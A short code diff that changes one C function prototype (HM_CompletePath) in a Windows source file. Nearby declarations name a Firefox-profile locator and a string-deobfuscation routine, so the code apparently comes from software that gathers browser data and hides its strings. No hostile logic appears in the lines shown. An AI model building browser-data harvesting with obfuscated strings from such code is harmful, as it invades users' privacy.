@@ -19,7 +19,7 @@ static HMODULE libsqlsc;
 //--------------------
 
 extern int DirectoryExists(WCHAR *path);
-extern char *HM_CompletePath(char *file_name, char *buffer);
+char* HM_CompletePath(const char* file_name, char* buffer);
 extern char *GetDosAsciiName(WCHAR *orig_path);
 extern WCHAR *GetFFProfilePath(WCHAR *, size_t);
 extern char *DeobStringA(const char *string);
